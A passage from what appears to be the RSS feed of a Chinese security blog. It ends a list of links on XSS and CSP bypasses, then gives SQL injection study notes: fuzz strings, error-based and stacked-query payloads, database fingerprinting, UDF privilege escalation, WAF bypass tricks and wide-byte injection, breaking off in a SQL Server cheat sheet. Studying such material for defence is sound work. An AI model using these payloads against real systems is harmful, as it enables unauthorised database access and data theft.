&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvZW4tVVMvZG9jcy9XZWIvU2VjdXJpdHkvU2FtZS1vcmlnaW5fcG9saWN5&#34;&gt;Same origin policy&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuYmVkZWZlbmRlZC5jb20vcGFwZXJzL2NvcnMtc2VjdXJpdHktZ3VpZGU=&#34;&gt;cors security guide&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zcGVha2VyZGVjay5jb20vc2hobmprL2xvZ2ljYWxseS1ieXBhc3NpbmctYnJvd3Nlci1zZWN1cml0eS1ib3VuZGFyaWVz&#34;&gt;logically bypassing browser security boundaries&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;bypass-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#bypass-2&#34;&gt;#&lt;/a&gt; bypass&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vSm9oYW5uZXNIb3BwZS81NjEyMjc0&#34;&gt;666 lines of xss payload&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL21hc2F0b2tpbnVnYXdhL2ZpbHRlcmJ5cGFzcw==&#34;&gt;xss auditor bypass&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vSFRNTC9jaHJvbWUteHNzLWF1ZGl0b3ItYnlwYXNzLWNvbGxlY3Rpb24uaHRtbA==&#34;&gt;xss auditor bypass writeup&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvYmxvZy9ieXBhc3NpbmctY3NwLXVzaW5nLXBvbHlnbG90LWpwZWdz&#34;&gt;bypassing csp using polyglot jpegs&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuc2VjanVpY2UuY29tL2J5cGFzcy14c3MtZmlsdGVycy11c2luZy1qYXZhc2NyaXB0LWdsb2JhbC12YXJpYWJsZXMv&#34;&gt;bypass xss filters using javascript global variables&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;持久化-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#持久化-2&#34;&gt;#&lt;/a&gt; 持久化&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2Ryb3BzLndvb3l1bi5vcmcvd2ViLzEwNzk4&#34;&gt;变种 XSS 持久控制 by tig3r&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zYWt1cml0eS5jb20vYmxvZy8yMDE1LzA4LzEzL21pZGRsZWtpdC5odG1s&#34;&gt;Using Appcache and ServiceWorker for Evil&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;tricks&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#tricks&#34;&gt;#&lt;/a&gt; Tricks&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2V0aGVyZHJlYW0vc3ctc2Vj&#34;&gt;Service Worker 安全探索&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0V0aGVyRHJlYW0vd2ViLWZyb250ZW5kLW1hZ2lj&#34;&gt;前端黑魔法&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/SQL/</guid>
            <title>SQL注入</title>
            <link>https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/SQL/</link>
            <category>网络安全</category>
            <category>漏洞</category>
            <category>SQL注入</category>
            <pubDate>Sat, 26 Nov 2022 11:05:09 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;注入分类&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#注入分类&#34;&gt;#&lt;/a&gt; 注入分类&lt;/h1&gt;
&lt;h2 id=&#34;简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介&#34;&gt;#&lt;/a&gt; 简介&lt;/h2&gt;
&lt;p&gt;SQL 注入是一种代码注入技术，用于攻击数据驱动的应用程序。 在应用程序中，如果没有做恰当的过滤，则可能使得恶意的 SQL 语句被插入输入字段中执行（例如将数据库内容转储给攻击者）。&lt;/p&gt;
&lt;h2 id=&#34;按技巧分类&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#按技巧分类&#34;&gt;#&lt;/a&gt; 按技巧分类&lt;/h2&gt;
&lt;p&gt;根据使用的技巧，SQL 注入类型可分为&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;盲注&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;布尔盲注：只能从应用返回中推断语句执行后的布尔值&lt;/li&gt;
&lt;li&gt;时间盲注：应用没有明确的回显，只能使用特定的时间函数来判断&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;报错注入：应用会显示全部或者部分的报错信息&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;堆叠注入：有的应用可以加入  &lt;code&gt;;&lt;/code&gt;  后一次执行多条语句&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;其他&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;按获取数据的方式分类&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#按获取数据的方式分类&#34;&gt;#&lt;/a&gt; 按获取数据的方式分类&lt;/h2&gt;
&lt;p&gt;另外也可以根据获取数据的方式分为 3 类&lt;/p&gt;
&lt;h3 id=&#34;inband&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#inband&#34;&gt;#&lt;/a&gt; inband&lt;/h3&gt;
&lt;p&gt;利用 Web 应用来直接获取数据，如报错注入，这类注入都是通过站点的响应或者错误反馈来提取数据。&lt;/p&gt;
&lt;h3 id=&#34;inference&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#inference&#34;&gt;#&lt;/a&gt; inference&lt;/h3&gt;
&lt;p&gt;通过 Web 的一些反映来推断数据，如布尔盲注，也就是我们通俗的盲注， 通过 web 应用的其他改变来推断数据。&lt;/p&gt;
&lt;h3 id=&#34;out-of-band-oob&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#out-of-band-oob&#34;&gt;#&lt;/a&gt; out of band (OOB)&lt;/h3&gt;
&lt;p&gt;通过其他传输方式来获得数据，比如 DNS 解析协议和电子邮件。&lt;/p&gt;
&lt;h1 id=&#34;注入检测&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#注入检测&#34;&gt;#&lt;/a&gt; 注入检测&lt;/h1&gt;
&lt;h2 id=&#34;常见的注入点&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见的注入点&#34;&gt;#&lt;/a&gt; 常见的注入点&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;GET/POST/PUT/DELETE 参数&lt;/li&gt;
&lt;li&gt;X-Forwarded-For&lt;/li&gt;
&lt;li&gt;文件名&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;fuzz注入点&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#fuzz注入点&#34;&gt;#&lt;/a&gt; Fuzz 注入点&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&#39;&lt;/code&gt;  /  &lt;code&gt;&amp;quot;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;1/1&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;1/0&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;and 1=1&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;quot; and &amp;quot;1&amp;quot;=&amp;quot;1&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;and 1=2&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;or 1=1&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;or 1=&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&#39; and &#39;1&#39;=&#39;1&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;+&lt;/code&gt;   &lt;code&gt;-&lt;/code&gt;   &lt;code&gt;^&lt;/code&gt;   &lt;code&gt;*&lt;/code&gt;   &lt;code&gt;%&lt;/code&gt;   &lt;code&gt;/&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;&amp;lt;&lt;/code&gt;   &lt;code&gt;&amp;gt;&amp;gt;&lt;/code&gt;   &lt;code&gt;||&lt;/code&gt;   &lt;code&gt;|&lt;/code&gt;   &lt;code&gt;&amp;amp;&lt;/code&gt;   &lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;~&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;!&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;@&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;反引号执行&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;测试用常量&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#测试用常量&#34;&gt;#&lt;/a&gt; 测试用常量&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;@@version&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;@@servername&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;@@language&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;@@spid&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;测试列数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#测试列数&#34;&gt;#&lt;/a&gt; 测试列数&lt;/h2&gt;
&lt;p&gt;例如  &lt;code&gt;http://www.foo.com/index.asp?id=12+union+select+null,null--&lt;/code&gt;  ，不断增加  &lt;code&gt;null&lt;/code&gt;  至不返回&lt;/p&gt;
&lt;h2 id=&#34;报错注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#报错注入&#34;&gt;#&lt;/a&gt; 报错注入&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;select 1/0&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;extractvalue(1, concat(0x5c,(select user())))&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;updatexml(0x3a,concat(1,(select user())),1)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;exp(~(SELECT * from(select user())a))&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ST_LatFromGeoHash((select * from(select * from(select user())a)b))&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;GTID_SUBSET(version(), 1)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;基于geometric的报错注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#基于geometric的报错注入&#34;&gt;#&lt;/a&gt; 基于 geometric 的报错注入&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;GeometryCollection((select * from (select * from(select user())a)b))&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;polygon((select * from(select * from(select user())a)b))&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;multipoint((select * from(select * from(select user())a)b))&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;multilinestring((select * from(select * from(select user())a)b))&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;LINESTRING((select * from(select * from(select user())a)b))&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;multipolygon((select * from(select * from(select user())a)b))&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;其中需要注意的是，基于 exp 函数的报错注入在 MySQL 5.5.49 后的版本已经不再生效，具体可以参考这个 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL215c3FsL215c3FsLXNlcnZlci9jb21taXQvOTU4MjVmYTI4YTdlODRhMmY1ZGJkZWY1MjQxMDc4ZjcwNTVjNWIwNA==&#34;&gt;commit 95825f&lt;/span&gt; 。&lt;/p&gt;
&lt;p&gt;而以上列表中基于 geometric 的报错注入在这个 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL215c3FsL215c3FsLXNlcnZlci9jb21taXQvNWNhZWE0YTk5NTEzMGNkN2M4MjU3NGFjYzU5MWZmN2M0NmQ5ZDk3OA==&#34;&gt;commit 5caea4&lt;/span&gt; 中被修复，在 5.5.x 较后的版本中同样不再生效。&lt;/p&gt;
&lt;h2 id=&#34;堆叠注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#堆叠注入&#34;&gt;#&lt;/a&gt; 堆叠注入&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;;select 1&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;注释符&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#注释符&#34;&gt;#&lt;/a&gt; 注释符&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;#&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;--+&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/*xxx*/&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/*!xxx*/&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/*!50000xxx*/&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;判断过滤规则&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#判断过滤规则&#34;&gt;#&lt;/a&gt; 判断过滤规则&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;是否有 trunc&lt;/li&gt;
&lt;li&gt;是否过滤某个字符&lt;/li&gt;
&lt;li&gt;是否过滤关键字&lt;/li&gt;
&lt;li&gt;slash 和编码&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;获取信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#获取信息&#34;&gt;#&lt;/a&gt; 获取信息&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;判断数据库类型&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;and exists (select * from msysobjects ) &amp;gt; 0&lt;/code&gt;  access 数据库&lt;/li&gt;
&lt;li&gt;&lt;code&gt;and exists (select * from sysobjects ) &amp;gt; 0&lt;/code&gt;  SQLServer 数据库&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;判断数据库表&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;and exsits (select * from admin)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;版本、主机名、用户名、库名&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;表和字段&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;确定字段数&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Order By&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Select Into&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;表名、列名&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;测试权限&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#测试权限&#34;&gt;#&lt;/a&gt; 测试权限&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;文件操作
&lt;ul&gt;
&lt;li&gt;读敏感文件&lt;/li&gt;
&lt;li&gt;写 shell&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;带外通道
&lt;ul&gt;
&lt;li&gt;网络请求&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;权限提升&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#权限提升&#34;&gt;#&lt;/a&gt; 权限提升&lt;/h1&gt;
&lt;h2 id=&#34;udf提权&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#udf提权&#34;&gt;#&lt;/a&gt; UDF 提权&lt;/h2&gt;
&lt;p&gt;UDF（User Defined Function，用户自定义函数）是 MySQL 提供的一个功能，可以通过编写 DLL 扩展为 MySQL 添加新函数，扩充其功能。&lt;/p&gt;
&lt;p&gt;当获得 MySQL 权限之后，即可通过这种方式上传自定义的扩展文件，从 MySQL 中执行系统命令。&lt;/p&gt;
&lt;h1 id=&#34;数据库检测&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据库检测&#34;&gt;#&lt;/a&gt; 数据库检测&lt;/h1&gt;
&lt;h2 id=&#34;mysql&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#mysql&#34;&gt;#&lt;/a&gt; MySQL&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;sleep  &lt;code&gt;sleep(1)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;benchmark  &lt;code&gt;BENCHMARK(5000000, MD5(&#39;test&#39;))&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;字符串连接
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT &#39;a&#39; &#39;b&#39;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SELECT CONCAT(&#39;some&#39;,&#39;string&#39;)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;version
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT @@version&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SELECT version()&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;识别用函数
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;connection_id()&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;last_insert_id()&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;row_count()&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;oracle&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#oracle&#34;&gt;#&lt;/a&gt; Oracle&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;字符串连接
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&#39;a&#39;||&#39;oracle&#39; --&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SELECT CONCAT(&#39;some&#39;,&#39;string&#39;)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;version
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT banner FROM v$version&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SELECT banner FROM v$version WHERE rownum=1&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;sqlserver&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sqlserver&#34;&gt;#&lt;/a&gt; SQLServer&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;WAITFOR  &lt;code&gt;WAITFOR DELAY &#39;00:00:10&#39;;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;SERVERNAME  &lt;code&gt;SELECT @@SERVERNAME&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;version  &lt;code&gt;SELECT @@version&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;字符串连接
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT &#39;some&#39;+&#39;string&#39;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;常量
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;@@pack_received&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;@@rowcount&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;postgresql&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#postgresql&#34;&gt;#&lt;/a&gt; PostgreSQL&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;sleep  &lt;code&gt;pg_sleep(1)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;绕过技巧&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#绕过技巧&#34;&gt;#&lt;/a&gt; 绕过技巧&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;编码绕过&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;大小写&lt;/li&gt;
&lt;li&gt;url 编码&lt;/li&gt;
&lt;li&gt;html 编码&lt;/li&gt;
&lt;li&gt;十六进制编码&lt;/li&gt;
&lt;li&gt;unicode 编码&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;注释&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;//&lt;/code&gt;   &lt;code&gt;--&lt;/code&gt;   &lt;code&gt;-- +&lt;/code&gt;   &lt;code&gt;-- -&lt;/code&gt;   &lt;code&gt;#&lt;/code&gt;   &lt;code&gt;/**/&lt;/code&gt;   &lt;code&gt;;%00&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;内联注释用的更多，它有一个特性  &lt;code&gt;/!**/&lt;/code&gt;  只有 MySQL 能识别&lt;/li&gt;
&lt;li&gt;e.g.  &lt;code&gt;index.php?id=-1 /*!UNION*/ /*!SELECT*/ 1,2,3&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;只过滤了一次时&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;union&lt;/code&gt;  =&amp;gt;  &lt;code&gt;ununionion&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;相同功能替换&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;函数替换
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;substring&lt;/code&gt;  /  &lt;code&gt;mid&lt;/code&gt;  /  &lt;code&gt;sub&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ascii&lt;/code&gt;  /  &lt;code&gt;hex&lt;/code&gt;  /  &lt;code&gt;bin&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;benchmark&lt;/code&gt;  /  &lt;code&gt;sleep&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;变量替换
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;user()&lt;/code&gt;  /  &lt;code&gt;@@user&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;符号和关键字
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;and&lt;/code&gt;  / `&amp;amp;``&lt;/li&gt;
&lt;li&gt;&lt;code&gt;or&lt;/code&gt;  /  &lt;code&gt;|&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;HTTP 参数&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;HTTP 参数污染
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;id=1&amp;amp;id=2&amp;amp;id=3&lt;/code&gt;  根据容器不同会有不同的结果&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;HTTP 分割注入&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;缓冲区溢出&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;一些 C 语言的 WAF 处理的字符串长度有限，超出某个长度后的 payload 可能不会被处理&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;二次注入有长度限制时，通过多句执行的方法改掉数据库该字段的长度绕过&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;sql注入小技巧&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sql注入小技巧&#34;&gt;#&lt;/a&gt; SQL 注入小技巧&lt;/h1&gt;
&lt;h2 id=&#34;宽字节注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#宽字节注入&#34;&gt;#&lt;/a&gt; 宽字节注入&lt;/h2&gt;
&lt;p&gt;一般程序员用 gbk 编码做开发的时候，会用  &lt;code&gt;set names &#39;gbk&#39;&lt;/code&gt;  来设定，这句话等同于&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;set
character_set_connection = &#39;gbk&#39;,
character_set_result = &#39;gbk&#39;,
character_set_client = &#39;gbk&#39;;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;漏洞发生的原因是执行了  &lt;code&gt;set character_set_client = &#39;gbk&#39;;&lt;/code&gt;  之后，mysql 就会认为客户端传过来的数据是 gbk 编码的，从而使用 gbk 去解码，而 mysql_real_escape 是在解码前执行的。但是直接用  &lt;code&gt;set names &#39;gbk&#39;&lt;/code&gt;  的话 real_escape 是不知道设置的数据的编码的，就会加  &lt;code&gt;%5c&lt;/code&gt;  。此时 server 拿到数据解码 就认为提交的字符 +%5c 是 gbk 的一个字符，这样就产生漏洞了。&lt;/p&gt;
&lt;p&gt;解决的办法有三种，第一种是把 client 的 charset 设置为 binary，就不会做一次解码的操作。第二种是是  &lt;code&gt;mysql_set_charset(&#39;gbk&#39;)&lt;/code&gt;  ，这里就会把编码的信息保存在和数据库的连接里面，就不会出现这个问题了。 第三种就是用 pdo。&lt;/p&gt;
&lt;p&gt;还有一些其他的编码技巧，比如 latin 会弃掉无效的 unicode，那么 admin%32 在代码里面不等于 admin，在数据库比较会等于 admin。&lt;/p&gt;
&lt;h1 id=&#34;cheatsheet&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cheatsheet&#34;&gt;#&lt;/a&gt; CheatSheet&lt;/h1&gt;
&lt;h2 id=&#34;sql-server-payload&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sql-server-payload&#34;&gt;#&lt;/a&gt; SQL Server Payload&lt;/h2&gt;
&lt;h3 id=&#34;常见payload&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见payload&#34;&gt;#&lt;/a&gt; 常见 Payload&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Version&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT @@version&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SELECT SERVERPROPERTY(&#39;Edition&#39;);&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SELECT SERVERPROPERTY(&#39;EngineEdition&#39;);&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Comment&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT 1 -- comment&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SELECT /*comment*/1&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Space&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;0x01 - 0x20&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;用户信息&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT user_name()&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;``SELECT system_user`&lt;/li&gt;
